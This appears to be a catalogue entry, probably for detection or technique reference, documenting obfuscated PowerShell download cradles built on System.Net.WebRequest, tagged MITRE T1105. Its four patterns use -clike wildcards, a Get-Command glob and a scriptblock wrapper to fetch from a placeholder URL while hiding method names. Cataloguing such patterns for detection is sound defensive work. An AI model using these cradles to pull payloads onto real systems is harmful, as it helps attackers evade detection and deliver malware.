---
Name: Net.WebRequest
Description: ".NET WebRequest class for HTTP requests. The -clike operator enables wildcard matching on PSObject.Methods, resolving method names (e.g., GetResponse, GetResponseStream) without typing them in full — a glob mechanism orthogonal to cmdlet-level gcm resolution."
Platform: powershell
BinaryPath:
  - ".NET class (System.Net.WebRequest)"
Category: download
MitreID: T1105
Patterns:
  - Pattern: "$r=[Net.WebRequest]::Create('http://...');$r.(($r.PsObject.Methods|?{$_.Name-clike'G*se'}).Name).Invoke()"
    Wildcards: ["*"]
    Notes: "-clike 'G*se' resolves GetResponse via PSObject.Methods wildcard matching"
  - Pattern: "$r=[Net.WebRequest]::Create('http://...');$res=$r.(($r.PsObject.Methods|?{$_.Name-clike'G*se'}).Name).Invoke();$s=$res.(($res.PsObject.Methods|?{$_.Name-clike'G*eam'}).Name).Invoke()"
    Wildcards: ["*"]
    Notes: "Chained -clike globs: G*se resolves GetResponse, G*eam resolves GetResponseStream"
  - Pattern: "$r=(& (gcm N*-Obj*) System.Net.WebRequest)::Create('http://...');$r.(($r.PsObject.Methods|?{$_.Name-clike'G*se'}).Name).Invoke()"
    Wildcards: ["*"]
    Notes: "gcm glob on New-Object combined with -clike method glob — two independent glob layers"
  - Pattern: "[scriptblock]::Create(\"$r=[Net.WebRequest]::Create('http://...');$r.(($r.PsObject.Methods|?{$_.Name-clike'G*se'}).Name).Invoke()\").Invoke()"
    Wildcards: ["*"]
    Notes: "ScriptBlock-wrapped cradle with -clike method resolution for deferred execution"
PlatformNotes: |
  The `-clike` operator performs case-sensitive wildcard matching. Used against `$obj.PsObject.Methods` it resolves .NET method names at runtime without requiring the full string — a technique distinct from `gcm`/`gal` cmdlet glob resolution.

  Example resolutions: `G*se` → `GetResponse`, `G*eam` → `GetResponseStream`, `D*g` → `DownloadString`.

  Credit: [mgeeky](https://github.com/mgeeky) — [PowerShell Download Cradles](https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38)
Resources:
  - https://attack.mitre.org/techniques/T1105/
  - https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38
---
